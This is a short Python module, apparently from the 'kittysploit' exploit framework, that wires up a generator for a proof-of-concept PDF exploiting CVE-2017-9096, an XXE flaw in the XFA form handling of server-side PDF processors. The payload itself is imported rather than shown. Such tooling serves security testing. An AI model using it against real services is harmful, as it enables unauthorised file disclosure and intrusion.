#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.pdf.mixins import PdfCveMixin
from lib.pdf.generators.xxe import write_xxe_xfa_acroform


class Module(Auxiliary, PdfCveMixin):
    __info__ = {
        "name": 'PDF CVE-2017-9096 XXE XFA Form',
        "description": 'Generate PDF PoC for CVE-2017-9096: XXE in AcroForm /XFA XML stream for server-side PDF processors.',
        "author": ["KittySploit Team"],
        "cve": ['CVE-2017-9096'],
        "references": ['https://nvd.nist.gov/vuln/detail/CVE-2017-9096'],
        "tags": ['pdf', 'cve-2017-9096', 'xxe', 'xfa', 'pdfbox', 'itext'],
    }

    PDF_GENERATORS = (
        write_xxe_xfa_acroform,
    )

    CVE_IDS = ['CVE-2017-9096']
    MODULE_TITLE = 'PDF CVE-2017-9096 XXE XFA Form'

    def run(self):
        return self.run_pdf_cve()